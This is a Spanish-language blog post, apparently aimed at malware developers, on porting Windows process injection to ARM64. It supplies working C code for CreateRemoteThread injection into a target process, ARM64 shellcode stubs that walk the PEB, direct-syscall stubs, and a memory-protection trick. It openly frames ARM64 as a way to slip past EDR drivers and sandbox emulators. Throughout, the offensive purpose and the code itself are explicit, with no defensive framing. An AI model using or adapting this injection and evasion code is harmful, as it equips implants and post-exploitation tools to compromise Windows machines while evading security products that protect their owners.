---
title: "Inyección de Procesos: Portando de x86_64 a ARM64 en Windows"
date: 2026-03-14
tags:
  - maldev
  - arm64
  - inyeccion
  - evasion
description: Notas prácticas sobre cómo portar la inyección de procesos clásica de Windows (CreateRemoteThread, NtCreateThreadEx) a ARM64 — qué es igual, qué cambia, y dónde ARM64 hace la detección más difícil.
---

## Por qué importa Windows en ARM64

Los Surface Pro X de Microsoft, laptops con Qualcomm Snapdragon y una parte significativa de dispositivos corporativos corren Windows en ARM. Parallels en Apple Silicon ejecuta Windows ARM64 de forma nativa. Azure tiene VMs ARM64.

La mayoría del tooling ofensivo sigue apuntando a x86_64. Si estás construyendo implants o herramientas de post-explotación en 2026, Windows ARM64 es una superficie de ataque real — y la mayoría de productos EDR tienen cobertura significativamente menor allí.

---

## Qué se mantiene igual

La superficie de la API de Windows es idéntica. `CreateRemoteThread`, `VirtualAllocEx`, `WriteProcessMemory`, `NtCreateThreadEx` todos existen en ARM64 con las mismas firmas de función. MSDN aplica por igual.

La convención de llamada Win32 para ARM64 es AAPCS64 (el estándar de ARM), pero como estás llamando a través de wrappers de la Win32 API, generalmente no necesitas preocuparte por eso en código de alto nivel.

WOW64 existe en ARM64 — los procesos x86 corren bajo emulación, y x86_64 bajo una segunda capa de emulación. Esto importa para los procesos objetivo de inyección.

---

## Diferencias en shellcode

Aquí se pone interesante. El shellcode x86_64 **no** corre de forma nativa en ARM64. Necesitas shellcode ARM64 para procesos ARM64 nativos.

El shellcode clásico de `MessageBox` para x86_64 no va a funcionar. Hay que portarlo o reescribirlo.

**Esqueleto de shellcode x86_64 (simplificado):**
```nasm
; Patrón PIC x86_64
; Localizar kernel32 via PEB->Ldr->InLoadOrderModuleList
xor rcx, rcx
mov rax, gs:[rcx+0x60]   ; PEB
mov rax, [rax+0x18]       ; Ldr
mov rax, [rax+0x20]       ; InLoadOrderModuleList->Flink
```

**Equivalente en ARM64:**
```asm
; ARM64 — sin registros de segmento, acceso diferente a TEB/PEB
mrs x0, tpidr_el0          ; registro de hilo (TEB en Windows ARM64)
ldr x0, [x0, #0x60]        ; PEB
ldr x0, [x0, #0x18]        ; Ldr
ldr x0, [x0, #0x20]        ; InLoadOrderModuleList->Flink
```

Diferencias clave:
- No existe `gs:` — usar `mrs x0, tpidr_el0` para obtener el TEB
- Los registros son `x0-x30` (64 bits) / `w0-w30` (mitad inferior 32 bits), sin `rax/rbx`
- `call` es `bl` o `blr` (branch with link); el retorno está en `x30` (LR)
- El stack crece hacia abajo, `sp` debe mantenerse alineado a 16 bytes en llamadas
- No existe `push`/`pop` — usar pares `stp`/`ldp`

---

## Inyección clásica: CreateRemoteThread

El patrón de llamada a la API es idéntico en C, independientemente de la arquitectura:

```c
#include <windows.h>

BOOL InyectarShellcode(DWORD pid, LPVOID shellcode, SIZE_T size) {
    HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProc) return FALSE;

    LPVOID remoto = VirtualAllocEx(hProc, NULL, size,
                                    MEM_COMMIT | MEM_RESERVE,
                                    PAGE_EXECUTE_READWRITE);
    if (!remoto) { CloseHandle(hProc); return FALSE; }

    WriteProcessMemory(hProc, remoto, shellcode, size, NULL);

    HANDLE hThread = CreateRemoteThread(hProc, NULL, 0,
                                         (LPTHREAD_START_ROUTINE)remoto,
                                         NULL, 0, NULL);
    WaitForSingleObject(hThread, INFINITE);

    CloseHandle(hThread);
    CloseHandle(hProc);
    return TRUE;
}
```

Compilar con `clang-cl` apuntando a ARM64:

```bat
clang-cl /target arm64-pc-windows-msvc inject.c /link /out:inject_arm64.exe
```

El código anterior compila y funciona en Windows ARM64 sin modificaciones.

---

## Dónde ARM64 realmente ayuda a la evasión

**1. Brechas de cobertura de EDR**

La mayoría de drivers del kernel de EDR registran callbacks para las APIs de inyección comunes. En ARM64, muchos de estos drivers no cargan o tienen instrumentación reducida. Varía por proveedor, pero es una brecha real en 2026.

**2. Detección por emulación**

Si un EDR intenta emular tu shellcode para análisis en sandbox, el shellcode ARM64 corriendo a través de un emulador x86 no va a funcionar correctamente. La mayoría de emuladores de sandbox son x86 primero.

**3. `PAGE_EXECUTE_READWRITE` sigue siendo ruidoso**

Esto aplica igual en ARM64. Usa el enfoque estándar dividido:
```c
// Reservar RW, escribir, luego cambiar a RX
LPVOID remoto = VirtualAllocEx(hProc, NULL, size, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
WriteProcessMemory(hProc, remoto, shellcode, size, NULL);
DWORD old;
VirtualProtectEx(hProc, remoto, size, PAGE_EXECUTE_READ, &old);
```

---

## Syscalls directas en ARM64

Las syscalls directas funcionan diferente en ARM64. La instrucción equivalente a `syscall` es `svc #0` en ensamblador ARM. Los números de syscall son **los mismos** que en x86_64 en Windows (están en una tabla compartida), pero la estructura del stub es distinta.

Patrón de stub syscall x86_64:
```nasm
mov r10, rcx
mov eax, <SYSNUM>
syscall
ret
```

Stub syscall ARM64:
```asm
mov x8, <SYSNUM>   ; número de syscall en x8
svc #0              ; supervisor call
ret
```

Herramientas como `SysWhispers3` tienen soporte ARM64 en versiones recientes. Para implementación manual, extrae los números de syscall de la versión ARM64 de `ntdll.dll` igual que lo harías para x86_64.

---

## Enfoque práctico para tooling multi-arquitectura

Para una herramienta que necesite correr en ambas arquitecturas:

1. **Una sola base de código en C** — el código Win32 API es idéntico
2. **Shellcode específico por arquitectura** — compilar dos blobs, seleccionar en tiempo de ejecución
3. **Detección de arquitectura en runtime:**

```c
#include <windows.h>

BOOL EsARM64() {
    SYSTEM_INFO si;
    GetNativeSystemInfo(&si);
    return si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_ARM64;
}
```

4. **Matriz de CI para compilar ambos targets:**

```yaml
# GitHub Actions
strategy:
  matrix:
    arch: [x64, arm64]

steps:
  - name: Compilar
    run: cmake -A ${{ matrix.arch }} . && cmake --build .
```

---

## Estado actual (Marzo 2026)

El tooling ofensivo para Windows ARM64 sigue siendo inmaduro comparado con x86_64. La mayoría de frameworks C2 públicos (Sliver, Havoc, Cobalt Strike) tienen soporte de agente ARM64 en distintos estados de completitud.

La brecha se está ampliando a medida que la adopción de dispositivos ARM64 crece más rápido que los vendors de EDR añaden lógica de detección específica para ARM64. Vale la pena invertir ahora.

---

## Recursos

- [Convenciones ABI de Windows ARM64 — Microsoft](https://docs.microsoft.com/en-us/cpp/build/arm64-windows-abi-conventions)
- [SysWhispers3](https://github.com/klezVirus/SysWhispers3) — soporte syscalls ARM64
- Sektor7 MalDev Intermediate — técnicas de inyección de procesos
- [modexp.wordpress.com](https://modexp.wordpress.com) — análisis excelente a bajo nivel de Windows/ARM
